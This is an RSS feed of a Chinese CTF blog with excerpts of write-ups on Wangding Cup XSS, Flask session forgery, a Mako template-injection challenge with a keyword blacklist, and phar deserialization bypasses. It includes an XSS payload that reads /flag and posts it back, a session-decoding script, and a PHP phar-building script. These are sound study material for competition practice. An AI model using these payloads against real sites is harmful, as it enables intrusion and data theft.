<?xml version="1.0" encoding="UTF-8"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:content="http://purl.org/rss/1.0/modules/content/"><channel><title>baozongwi's blog</title><link>https://baozongwi.xyz/</link><description>baozongwi's blog</description><lastBuildDate>Thu, 19 Feb 2026 21:44:49 +0800</lastBuildDate><atom:link href="https://baozongwi.xyz/" rel="self" type="application/rss+xml"/><item><title>网鼎杯2024青龙组</title><link>https://baozongwi.xyz/p/wangding-cup-2024-qinglong-group/</link><guid>https://baozongwi.xyz/p/wangding-cup-2024-qinglong-group/</guid><pubDate>Tue, 29 Oct 2024 10:57:28 +0000</pubDate><description>0x01 感觉感觉不出来什么感觉
0x02 签到 直接交flag
web02 首先F12看到是Werkzeug/3.0.3 Python/3.8.19
然后就会往ssti去靠了，随便登录之后发现没啥区别，会自动生成一个哈希，然后用payloadallthings进行fuzz，进行回显查看，发现还是不行
查看源代码发现是直接插入的
1 2 3 4 5 6 7 8 9 10 11 12 &amp;amp;lt;/div&amp;amp;gt; &amp;amp;lt;/form&amp;amp;gt; &amp;amp;lt;br&amp;amp;gt; &amp;amp;lt;br&amp;amp;gt; &amp;amp;lt;h3&amp;amp;gt;无人机 ToDo List&amp;amp;lt;/h3&amp;amp;gt; &amp;amp;lt;div&amp;amp;gt;1. 早上起飞监控&amp;amp;lt;/div&amp;amp;gt; &amp;amp;lt;br&amp;amp;gt; &amp;amp;lt;div&amp;amp;gt;2. 中午加班监控&amp;amp;lt;/div&amp;amp;gt; &amp;amp;lt;br&amp;amp;gt; &amp;amp;lt;div&amp;amp;gt;3. 晚上回收并进行复盘&amp;amp;lt;/div&amp;amp;gt; &amp;amp;lt;br&amp;amp;gt;2&amp;amp;lt;br&amp;amp;gt; &amp;amp;lt;/div&amp;amp;gt; 1 &amp;amp;lt;script&amp;amp;gt;alert(1)&amp;amp;lt;/script&amp;amp;gt; 成功弹窗
然后有个/flag路由，这里我们是将路由给写到当前页面
1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 POST /content/f2260ea5a2a5967f8e4a7e80322363c7 HTTP/1.1 Host: 0192d5e248dc7e5b87ec4d98a1a66d68.8fwa.dg09.ciihw.cn:46739 Content-Length: 273 Cache-Control: max-age=0 Origin: http://0192d5e248dc7e5b87ec4d98a1a66d68.8fwa.dg09.ciihw.cn:46739 Content-Type: application/x-www-form-urlencoded Upgrade-Insecure-Requests: 1 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7 Referer: http://0192d5e248dc7e5b87ec4d98a1a66d68.8fwa.dg09.ciihw.cn:46739/content/f2260ea5a2a5967f8e4a7e80322363c7 Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9,en;q=0.8 Connection: close content=&amp;amp;lt;script&amp;amp;gt; fetch(&amp;amp;#39;/flag&amp;amp;#39;).then(response =&amp;amp;gt; response.text()).then(data =&amp;amp;gt; { fetch(&amp;amp;#39;/content/f2260ea5a2a5967f8e4a7e80322363c7&amp;amp;#39;,{ method:&amp;amp;#39;POST&amp;amp;#39;, headers:{&amp;amp;#39;Content-Type&amp;amp;#39;:&amp;amp;#39;application/x-www-form-urlencoded&amp;amp;#39;}, body:&amp;amp;#34;content=1&amp;amp;#34;%2bdata }) }) &amp;amp;lt;/script&amp;amp;gt; 然后提交任务就可以了</description><content:encoded>0x01 感觉感觉不出来什么感觉
0x02 签到 直接交flag
web02 首先F12看到是Werkzeug/3.0.3 Python/3.8.19
然后就会往ssti去靠了，随便登录之后发现没啥区别，会自动生成一个哈希，然后用payloadallthings进行fuzz，进行回显查看，发现还是不 …</content:encoded></item><item><title>markdown常用语法</title><link>https://baozongwi.xyz/p/markdown-common-syntax/</link><guid>https://baozongwi.xyz/p/markdown-common-syntax/</guid><pubDate>Mon, 28 Oct 2024 21:15:30 +0000</pubDate><description>写md最开始看的文章</description><content:encoded>0x01 前言 程序员都用的做笔记的语法，也是非常实用了，下面我只提及好用并且经常用的
0x02 action 常用的 首先就是标题，使用#
1 2 3 4 # 一级标题 ## 二级标题 ### 三级标题 总共最多是六级标题 加粗，Ctrl+B
代码的包裹，使用反引号
1 `baozongwi` 代 …</content:encoded></item><item><title>flask中的session伪造</title><link>https://baozongwi.xyz/p/flask-session-forgery/</link><guid>https://baozongwi.xyz/p/flask-session-forgery/</guid><pubDate>Tue, 22 Oct 2024 15:30:50 +0000</pubDate><description>0x01 说在前面 在一般的情况下，网站都会做一个简答的身份验证，而flask当中自然也有，这种就是我们常见的session，session是什么，可以看这个文章
1 https://baozongwi.xyz/2024/09/11/%E6%B5%85%E8%B0%88session%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/ 0x02 question 现在网上进行session伪造的很少有不需要key的几乎没有，所以这里推荐一个工具叫做flask-unsign，还有就是大家经常使用的脚本，不过我们先看一下结构
结构 先随便生成一个session
1 eyJsb2NhbGUiOiJlbiJ9-ZSDIwA-v5-mHM9ITAx5lbFhwa3jNnWTIYY Flask Session 的组成结构主要由三部分构成，第一部分为 Session Data ，即会话数据。第二部分为 Timestamp ，即时间戳。第三部分为 Cryptographic Hash ，即加密哈希。如下图
下面的结果是看P牛的博客知道的(他有代码)
json.dumps 将对象转换成json字符串，作为数据 如果数据压缩后长度更短，则用zlib库进行压缩 将数据用base64编码 通过hmac算法计算数据的签名，将签名附在数据后，用“.”分割 签名只能防篡改不能防止被读取，所以我们只要有key就可以伪造cookie
解密代码 我们上面已经知道了逻辑，那么来分析一个脚本
1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 #!/usr/bin/env python3 import sys import zlib from base64 import b64decode from flask.sessions import session_json_serializer from itsdangerous import base64_decode def decryption(payload): payload, sig = payload.rsplit(b&amp;amp;#39;.&amp;amp;#39;, 1) payload, timestamp = payload.rsplit(b&amp;amp;#39;.&amp;amp;#39;, 1) decompress = False if payload.startswith(b&amp;amp;#39;.&amp;amp;#39;): payload = payload[1:] decompress = True try: payload = base64_decode(payload) except Exception as e: raise Exception(&amp;amp;#39;Could not base64 decode the payload because of &amp;amp;#39; &amp;amp;#39;an exception&amp;amp;#39;) if decompress: try: payload = zlib.decompress(payload) except Exception as e: raise Exception(&amp;amp;#39;Could not zlib decompress the payload before &amp;amp;#39; &amp;amp;#39;decoding the payload&amp;amp;#39;) return session_json_serializer.loads(payload) if __name__ == &amp;amp;#39;__main__&amp;amp;#39;: print(decryption(&amp;amp;#34;eyJ1c2VybmFtZSI6eyIgYiI6IlozVmxjM1E9In19.XyZ3Vw.OcD3-l1yOcq8vlg8g4Ww3FxrhVs&amp;amp;#34;.encode())) 一步步来首先，用.给session分开，然后看看是否是压缩过的</description><content:encoded>0x01 说在前面 在一般的情况下，网站都会做一个简答的身份验证，而flask当中自然也有，这种就是我们常见的session，session是什么，可以看这个文章
1 …</content:encoded></item><item><title>DASCTF 2024金秋十月</title><link>https://baozongwi.xyz/p/dasctf-2024-golden-autumn-october/</link><guid>https://baozongwi.xyz/p/dasctf-2024-golden-autumn-october/</guid><pubDate>Sat, 19 Oct 2024 21:33:07 +0000</pubDate><description>0x01 前言 之前学到flask计算pin值的时候就知道一个1可以代替self，来进行文件读取，不过基本没用过，最近有个CTF，我不知道叫什么，cxcx师傅来和我交流说pin值说好了，如何进console，此时是400错误，我左思右想，想不到这啥情况，难不成不打pin值？结果最后就是读取了环境变量
0x02 question linux中/proc 官方文档是英文就不放了，简单的来说就是proc是一个伪文件系统，它提供了内核数据结构的接口。它通常挂载在 /proc 目录下。一般是由系统自动挂载的，不过也可以通过 mount 命令进行手动挂载。proc 文件系统只包含系统运行时的信息（如系统内存、mount 设备信息等），它只存在于内存中而不占用外存空间。它以文件系统的形式，为访问内核数据的操作提供接口。
但是其中的文件大部分为只读，只有少部分文件可写，我们可以通过可写文件来修改内核的部分配置
文件 /proc/buddyinfo 每个内存区中的每个order有多少块可用，和内存碎片问题有关
/proc/cmdline 启动时传递给kernel的参数信息
/proc/cpuinfo cpu的信息
/proc/crypto 内核使用的所有已安装的加密密码及细节
/proc/devices 已经加载的设备并分类
/proc/dma 已注册使用的ISA DMA频道列表
/proc/execdomains Linux内核当前支持的execution domains
/proc/fb 帧缓冲设备列表，包括数量和控制它的驱动
/proc/filesystems 内核当前支持的文件系统类型
/proc/interrupts x86架构中的每个IRQ中断数
/proc/iomem 每个物理设备当前在系统内存中的映射
/proc/ioports 一个设备的输入输出所使用的注册端口范围
/proc/kcore 代表系统的物理内存，存储为核心文件格式，里边显示的是字节数，等于RAM大小加上4kb
/proc/kmsg 记录内核生成的信息，可以通过/sbin/klogd或/bin/dmesg来处理
/proc/loadavg 根据过去一段时间内CPU和IO的状态得出的负载状态，与uptime命令有关
/proc/locks 内核锁住的文件列表
/proc/mdstat 多硬盘，RAID配置信息(md=multiple disks)
/proc/meminfo RAM使用的相关信息
/proc/misc 其他的主要设备(设备号为10)上注册的驱动
/proc/modules 所有加载到内核的模块列表
/proc/mounts 系统中使用的所有挂载
/proc/mtrr 系统使用的Memory Type Range Registers (MTRRs)
/proc/partitions 分区中的块分配信息
/proc/pci 系统中的PCI设备列表</description><content:encoded>0x01 前言 之前学到flask计算pin值的时候就知道一个1可以代替self，来进行文件读取，不过基本没用过，最近有个CTF，我不知道叫什么，cxcx师傅来和我交流说pin值说好了，如何进console，此时是400错误，我左思右想，想不到这啥情况，难不成不打pin值？ …</content:encoded></item><item><title>强网拟态2024</title><link>https://baozongwi.xyz/p/qiangwang-mimic-2024/</link><guid>https://baozongwi.xyz/p/qiangwang-mimic-2024/</guid><pubDate>Sat, 19 Oct 2024 20:28:38 +0000</pubDate><description>明年一定进决赛</description><content:encoded>0x01 说在前面 省赛搞一起了，我连账号都没有，不过借到朋友的账号可以试试看:grin:
0x02 question capoo 发现可以任意文件读取，读到的是base64的编码情况，直接尝试读flag，失败了
1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 POST …</content:encoded></item><item><title>四川省赛2024</title><link>https://baozongwi.xyz/p/sichuan-provincial-2024/</link><guid>https://baozongwi.xyz/p/sichuan-provincial-2024/</guid><pubDate>Sat, 19 Oct 2024 19:52:26 +0000</pubDate><description>0x01 说在前面 这次被两个哥哥带飞了，哎也就给打个下手(看脚本和信息收集还有找flag)，拿了一个二等奖
ctf:21/89,awdp:13/89
0x02 question CTF web1 一个ssti，但是感觉又不太像ssti
1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 from flask import Flask, render_template, request, redirect, url_for from flask_mako import MakoTemplates, render_template as mako_render_template from mako.template import Template as Mako_T # from flask_mako import MakoTemplates app = Flask(__name__) mako = MakoTemplates(app) welcome_string = &amp;amp;#34;&amp;amp;#34;&amp;amp;#34; &amp;amp;lt;!DOCTYPE html&amp;amp;gt; &amp;amp;lt;html&amp;amp;gt; &amp;amp;lt;head&amp;amp;gt; &amp;amp;lt;title&amp;amp;gt;My APP&amp;amp;lt;/title&amp;amp;gt; &amp;amp;lt;style&amp;amp;gt; body { font-family: Arial, sans-serif; } .header { background-color: #f2f2f2; padding: 10px; text-align: left; } .body { padding: 20px; } &amp;amp;lt;/style&amp;amp;gt; &amp;amp;lt;/head&amp;amp;gt; &amp;amp;lt;body&amp;amp;gt; &amp;amp;lt;div class=&amp;amp;#34;header&amp;amp;#34;&amp;amp;gt; Welcome %s ! %%if title: This your admin page. %%endif &amp;amp;lt;/div&amp;amp;gt; &amp;amp;lt;div class=&amp;amp;#34;body&amp;amp;#34;&amp;amp;gt; &amp;amp;lt;p&amp;amp;gt;This is your profile。&amp;amp;lt;/p&amp;amp;gt; &amp;amp;lt;/div&amp;amp;gt; &amp;amp;lt;/body&amp;amp;gt; &amp;amp;lt;/html&amp;amp;gt; &amp;amp;#34;&amp;amp;#34;&amp;amp;#34; welcome_message = &amp;amp;#34;welcome&amp;amp;#34; black_list = [&amp;amp;#39;${&amp;amp;#39;, &amp;amp;#39;import&amp;amp;#39;, &amp;amp;#39;os&amp;amp;#39;, &amp;amp;#39;system&amp;amp;#39;, &amp;amp;#39;popen&amp;amp;#39;, &amp;amp;#39;join&amp;amp;#39;, &amp;amp;#39;context&amp;amp;#39;, &amp;amp;#39;sys&amp;amp;#39;, &amp;amp;#39;__&amp;amp;#39;, &amp;amp;#39;builtins&amp;amp;#39;, &amp;amp;#39;eval&amp;amp;#39;, &amp;amp;#39;exec&amp;amp;#39;, &amp;amp;#39;ord&amp;amp;#39;] @app.route(&amp;amp;#39;/&amp;amp;#39;, methods=[&amp;amp;#39;GET&amp;amp;#39;, &amp;amp;#39;POST&amp;amp;#39;]) def index(): if request.method == &amp;amp;#39;POST&amp;amp;#39;: username = request.form[&amp;amp;#39;username&amp;amp;#39;] return redirect(url_for(&amp;amp;#39;welcome&amp;amp;#39;, username=username)) return mako_render_template(&amp;amp;#39;index.html&amp;amp;#39;) @app.route(&amp;amp;#39;/welcome&amp;amp;#39;) def welcome(): username = request.args.get(&amp;amp;#39;username&amp;amp;#39;) if len(username) &amp;amp;gt; 42: return &amp;amp;#34;error username&amp;amp;#34; for key in black_list: if key.upper() in username.upper(): return &amp;amp;#34;bad username&amp;amp;#34; if username == &amp;amp;#34;Admin&amp;amp;#34;: return Mako_T(welcome_string % username).render(title=True) return Mako_T(welcome_string % username).render(title=False) if __name__ == &amp;amp;#39;__main__&amp;amp;#39;: app.run(host=&amp;amp;#39;0.0.0.0&amp;amp;#39;, port=5002) 首先有个自定义模块，其实结果应该就是渲染，只不过这里经过测试发现在</description><content:encoded>0x01 说在前面 这次被两个哥哥带飞了，哎也就给打个下手(看脚本和信息收集还有找flag)，拿了一个二等奖
ctf:21/89,awdp:13/89
0x02 question CTF web1 一个ssti，但是感觉又不太像ssti
1 2 3 4 5 6 7 8 9 10 11 12 13 …</content:encoded></item><item><title>ctfshow的thinkphp专题</title><link>https://baozongwi.xyz/p/ctfshow-thinkphp-special/</link><guid>https://baozongwi.xyz/p/ctfshow-thinkphp-special/</guid><pubDate>Wed, 16 Oct 2024 11:09:27 +0000</pubDate><description>刷</description><content:encoded>安装composer 我们肯定是要看源码的，所以下载这个工具在Windows
1 https://getcomposer.org/Composer-Setup.exe 下载之后，选中已经有的php.exe
如果在ini中有这个设置就把他注释了
1 …</content:encoded></item><item><title>phar反序列化bypass</title><link>https://baozongwi.xyz/p/phar-deserialization-bypass/</link><guid>https://baozongwi.xyz/p/phar-deserialization-bypass/</guid><pubDate>Sat, 12 Oct 2024 21:28:14 +0000</pubDate><description>0x01 前言 前面学习phar反序列化的时候我就看到有一些绕过姿势，但是感觉太多了，于是想着单写一篇
0x02 question 文件头 修改stub，在其中加入图片头即可
1 $phar-&amp;amp;gt;setStub(&amp;amp;#34;GIF89a&amp;amp;lt;?php __HALT_COMPILER();?&amp;amp;gt;&amp;amp;#34;); 协议 1 2 1、使用filter伪协议来进行绕过 php://filter/read=convert.base64-encode/resource=phar://phar.phar/m.php 1 2 3 4 5 6 7 8 9 10 11 12 13 &amp;amp;lt;?php class Hello{ public $name=&amp;amp;#39;bao&amp;amp;#39;; } @unlink(&amp;amp;#34;phar.phar&amp;amp;#34;); $phar=new Phar(&amp;amp;#34;phar.phar&amp;amp;#34;); $phar-&amp;amp;gt;startBuffering(); //开缓冲 $phar-&amp;amp;gt;setStub(&amp;amp;#34;GIF89a&amp;amp;lt;?php __HALT_COMPILER();?&amp;amp;gt;&amp;amp;#34;); $o=new Hello(); $phar-&amp;amp;gt;setMetadata($o); $phar-&amp;amp;gt;addFromString(&amp;amp;#34;m.php&amp;amp;#34;,&amp;amp;#34;&amp;amp;lt;?php system(&amp;amp;#39;dir&amp;amp;#39;); ?&amp;amp;gt;&amp;amp;#34;); //写入m.php $phar-&amp;amp;gt;stopBuffering(); //关缓冲 ?&amp;amp;gt; 1 2 &amp;amp;lt;?php include(&amp;amp;#39;php://filter/read=convert.base64-encode/resource=phar://phar.phar/m.php&amp;amp;#39;); 2、使用bzip2协议来进行绕过
这里还是正常生成一个phar文件，只不过要进行处理一下
1 2 3 bzip2 -k phar.phar compress.bzip2://phar://phar.phar/m.php 3、使用zlib协议进行绕过</description><content:encoded>0x01 前言 前面学习phar反序列化的时候我就看到有一些绕过姿势，但是感觉太多了，于是想着单写一篇
0x02 question 文件头 修改stub，在其中加入图片头即可
1 $phar-&amp;amp;amp;gt;setStub(&amp;amp;amp;#34;GIF89a&amp;amp;amp;lt;?php …</content:encoded></item></channel></rss>